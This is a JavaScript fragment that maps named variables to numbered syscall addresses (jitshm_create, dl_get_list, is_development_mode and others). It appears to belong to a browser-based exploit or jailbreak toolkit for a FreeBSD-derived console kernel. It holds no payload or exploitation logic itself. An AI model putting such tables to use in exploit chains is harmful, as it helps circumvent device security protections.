var sigwait_addr = sys_429_addr;
var sendfile_addr = sys_393_addr;
var fdatasync_addr = sys_658_addr;
var ksem_init_addr = sys_404_addr;
var netabort_addr = sys_101_addr;
var setpriority_addr = sys_96_addr;
var getsockopt_addr = sys_118_addr;
var set_uevt_addr = sys_640_addr;
var close_addr = sys_6_addr;
var mdbg_service_addr = sys_601_addr;
var blockpool_open_addr = sys_653_addr;
var truncate_addr = sys_479_addr;
var opmc_get_hw_addr = sys_626_addr;
var namedobj_create_addr = sys_557_addr;
var get_kernel_mem_statistics_addr = sys_646_addr;
var jitshm_create_addr = sys_533_addr;
var ksem_close_addr = sys_400_addr;
var dl_get_list_addr = sys_535_addr;
var thr_get_name_addr = sys_616_addr;
var thr_set_name_addr = sys_464_addr;
var select_addr = sys_93_addr;
var thr_resume_ucontext_addr = sys_633_addr;
var aio_multi_delete_addr = sys_662_addr;
var msync_addr = sys_65_addr;
var sigaltstack_addr = sys_53_addr;
var set_gpo_addr = sys_617_addr;
var dup2_addr = sys_90_addr;
var clock_settime_addr = sys_233_addr;
var ksem_trywait_addr = sys_403_addr;
var ipmimgr_call_addr = sys_622_addr;
var get_bio_usage_all_addr = sys_667_addr;
var opmc_set_hw_addr = sys_625_addr;
var kqueue_addr = sys_362_addr;
var opmc_get_ctr_addr = sys_567_addr;
var getsockname_addr = sys_32_addr;
var get_self_auth_info_addr = sys_607_addr;
var aio_get_data_addr = sys_665_addr;
var query_memory_protection_addr = sys_547_addr;
var rfork_addr = sys_251_addr;
var sys_exit_addr = sys_1_addr;
var sigtimedwait_addr = sys_345_addr;
var getpriority_addr = sys_100_addr;
var process_terminate_addr = sys_652_addr;
var getdtablesize_addr = sys_89_addr;
var is_development_mode_addr = sys_606_addr;
var jitshm_alias_addr = sys_534_addr;
var getuid_addr = sys_24_addr;
var pwrite_addr = sys_476_addr;
var ftruncate_addr = sys_480_addr;
var sigpending_addr = sys_343_addr;
var physhm_unlink_addr = sys_630_addr;
var getitimer_addr = sys_86_addr;
var read_addr = sys_3_addr;
var stat_addr = sys_188_addr;
var pwritev_addr = sys_290_addr;
